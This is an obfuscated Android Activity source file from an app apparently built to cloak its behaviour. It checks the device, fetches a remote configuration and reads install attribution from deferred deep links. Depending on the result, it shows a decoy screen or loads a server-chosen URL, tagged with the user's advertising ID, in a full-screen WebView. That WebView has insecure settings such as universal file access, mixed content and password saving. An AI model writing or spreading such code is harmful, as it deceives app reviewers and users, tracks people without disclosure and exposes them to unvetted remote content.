package com.mageas.jofd.mj.webjoker;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.mageas.jofd.mj.R;
import com.mageas.jofd.mj.webjoker.dev.Dev;
import com.mageas.jofd.mj.webjoker.par.Parssss;
import com.mageas.jofd.mj.webjoker.start.Ffd;
import com.mageas.jofd.mj.webjoker.start.StartG;
import com.mageas.jofd.mj.webjoker.we.Dsdf;

public class MJ extends AppCompatActivity {

    WebView fdfd;
    String dipfdd;
    String dippplinkkk;
    public ValueCallback<Uri> fdfdfoew;
    public Uri lefdd = null;
    public ValueCallback<Uri[]> jdfdf;
    public String dsdsds;
    public static final int fddf = 1;

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.mj);
        ActionBar actionBar = getSupportActionBar();
        actionBar.hide();

        fdfd = findViewById(R.id.webView1);

        if (Dev.devCh(this) == 0){

           new Thread(new Runnable() {
               @Override
               public void run() {
                   String s  = ConeGislado.coneGisda(MJ.this);
                   String [] dsd =  s.split("\\\u007C");
                   String u = dsd[0];
                   String k = dsd[1];
                   String f = dsd[2];
                   runOnUiThread(new Runnable() {
                       @Override
                       public void run() {
                           Ffd.fdfs(f,MJ.this);
                           ier();
                           String savedLink = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(D.dds("c2F2ZWRVcmw="), "fgbhfggf");
                           if (savedLink.equals("fgbhfggf")){
                               new Handler().postDelayed(new Runnable() {
                                   @Override
                                   public void run() {
                                       sreW();
                                       ewds(u,k);
                                   }
                               },5000);
                           }else {
                               sreW();
                               fdfd.loadUrl(savedLink);
                           }

                       }
                   });
               }
           }).start();
        }else {
            StartG.starGends(this);
        }

    }

    public void sreW(){
        CookieManager.getInstance().setAcceptThirdPartyCookies(fdfd, true);
        CookieManager.getInstance().setAcceptCookie(true);
        fdfd.setVisibility(View.VISIBLE);
        fdfd.getSettings().setAllowFileAccessFromFileURLs(true);
        fdfd.getSettings().setSavePassword(true);
        fdfd.getSettings().setDatabaseEnabled(true);
        fdfd.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
        fdfd.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_DEFAULT);
        fdfd.getSettings().setAppCacheEnabled(true);
        fdfd.getSettings().setLoadsImagesAutomatically(true);
        fdfd.setSaveEnabled(true);
        fdfd.getSettings().setMixedContentMode(0);
        fdfd.setFocusable(true);
        fdfd.getSettings().setAllowUniversalAccessFromFileURLs(true);
        fdfd.getSettings().setJavaScriptEnabled(true);
        fdfd.getSettings().setAllowContentAccess(true);
        fdfd.getSettings().setLoadWithOverviewMode(true);
        fdfd.getSettings().setEnableSmoothTransition(true);
        fdfd.getSettings().setUseWideViewPort(true);
        fdfd.getSettings().setSaveFormData(true);
        fdfd.getSettings().setAllowFileAccess(true);
        fdfd.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        fdfd.getSettings().setDomStorageEnabled(true);
        fdfd.setFocusableInTouchMode(true);
        fdfd.setWebViewClient(new Dsdf(MJ.this));
        fdfd.setWebChromeClient(new MJ.WebChrome());
    }

    public class WebChrome extends WebChromeClient{

        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public boolean onShowFileChooser(WebView view,
                                         ValueCallback<Uri[]> filePath,
                                         FileChooserParams fileChooserParams) {
            if (jdfdf != null) {
                jdfdf.onReceiveValue(null);
            }
            jdfdf = filePath;
            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
            contentSelectionIntent.setType("*/*");
            Intent[] intentArray = new Intent[0];
            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
            chooserIntent.putExtra(Intent.EXTRA_TITLE, D.dds("U2VsZWN0IE9wdGlvbjo="));
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
            startActivityForResult(chooserIntent, 1);
            return true;
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void ewds(String fdsw, String poiu){
        String lsdsd = ApplicationMJ.statusAfdlldf;
        String loewe = null;
        if (lsdsd.equals(D.dds("Tm9uLW9yZ2FuaWM="))){
            loewe = fdsw + ApplicationMJ.paramspewe ;
            fdfd.loadUrl(loewe);
        }else if(dipfdd != null) {
            loewe = fdsw + dippplinkkk;
            fdfd.loadUrl(loewe);
        }else {
            if (poiu.equals(D.dds("Tk8="))) {
               StartG.starGends(MJ.this);
            }else {
                String ffdf = poiu + "?bundle=" + getPackageName() + "&ad_id=" + ApplicationMJ.AIDoee + "&apps_id=" + ApplicationMJ.appsfdkfdf;
                loewe = fdsw + ffdf;
                fdfd.loadUrl(loewe);
            }
        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode != fddf || jdfdf == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        fdfdf(resultCode, data);
        if (fdfdfoew == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        opiu(resultCode, data);
    }

    public void fdfdf(int resultCode, Intent data){

        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (dsdsds != null) {
                    results = new Uri[]{Uri.parse(dsdsds)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        jdfdf.onReceiveValue(results);
        jdfdf = null;
    }

   public void opiu(int resultCode, Intent data){

       Uri result = null;
       try {
           if (resultCode != RESULT_OK) {
               result = null;
           } else {
               result = data == null ? lefdd : data.getData();
           }
       } catch (Exception e) { }
       fdfdfoew.onReceiveValue(result);
       fdfdfoew = null;
   }

    @Override
    public void onBackPressed() {
        if (fdfd.isFocused() && fdfd.canGoBack()) {
            fdfd.goBack();
        }
    }

    public void ier(){
        AppEventsLogger.activateApp(getApplication());
        AppLinkData.fetchDeferredAppLinkData(MJ.this,
                new AppLinkData.CompletionHandler() {
                    @Override
                    public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                        if (appLinkData == null) {
                            appLinkData = AppLinkData.createFromActivity(MJ.this);
                        }
                        if (appLinkData != null) {
                            Uri url = appLinkData.getTargetUri();
                            dipfdd = url.getQuery();
                            dippplinkkk = Parssss.par(dipfdd,getPackageName(), ApplicationMJ.AIDoee,ApplicationMJ.appsfdkfdf);

                        }else {

                        }
                    }

                }
        );
    }
}
